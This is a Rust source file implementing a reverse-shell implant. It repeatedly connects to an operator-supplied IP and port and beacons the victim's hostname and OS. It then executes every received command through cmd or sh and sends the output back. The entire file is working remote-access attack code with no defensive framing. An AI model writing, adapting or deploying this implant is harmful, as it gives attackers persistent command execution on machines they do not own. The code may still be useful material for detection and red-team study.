use std::env;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;

const BUF_SIZE: usize = 4096;

//TODO: this could failed because tje commmand is not being handle the exceptions 
fn hostname() -> String {
    if cfg!(windows) {
        env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into())
    } else {
        Command::new("hostname")
            .output()
            .ok()
            .and_then(|o| String::from_utf8(o.stdout).ok())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| "unknown".into())
    }
}

//TODO: check this ... maybe wont work in all scenarios :(
fn os_name() -> String {
    if cfg!(windows) {
        "Windows".to_string()
    } else {
        std::env::consts::OS.to_string()
    }
}

fn send_beacon(stream: &mut TcpStream) -> io::Result<()> {
    let meta = format!("{}|{}", hostname(), os_name());
    stream.write_all(meta.as_bytes())?;
    stream.write_all(&[0])?;
    stream.flush()
}

fn run_shell(mut stream: TcpStream) {
    let mut buf = [0u8; BUF_SIZE];

    loop {
        let mut cmd = String::new();
        loop {
            match stream.read(&mut buf) {
                Ok(0) => return,
                Ok(n) => {
                    cmd.push_str(&String::from_utf8_lossy(&buf[..n]));
                    if cmd.contains('\n') {
                        break;
                    }
                }
                Err(_) => return,
            }
        }

        let cmd = cmd.trim();
        if cmd.is_empty() {
            let _ = stream.write_all(&[0]);
            continue;
        }

        let output = if cfg!(windows) {
            Command::new("cmd")
                .args(["/C", cmd])
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .output()
        } else {
            Command::new("sh")
                .args(["-c", cmd])
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .output()
        };

        match output {
            Ok(out) => {
                let _ = stream.write_all(&out.stdout);
                let _ = stream.write_all(&out.stderr);
            }
            Err(e) => {
                let _ = stream.write_all(format!("exec error: {e}\n").as_bytes());
            }
        }

        let _ = stream.write_all(&[0]);
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        eprintln!("usage: {} <ip> <port>", args[0]);
        std::process::exit(1);
    }

    let addr = format!("{}:{}", args[1], args[2]);

    loop {
        match TcpStream::connect(&addr) {
            Ok(mut stream) => {
                let _ = stream.set_read_timeout(None);
                let _ = stream.set_write_timeout(None);
                if send_beacon(&mut stream).is_ok() {
                    run_shell(stream);
                }
            }
            Err(_) => {}
        }
        thread::sleep(Duration::from_secs(3));
    }
}
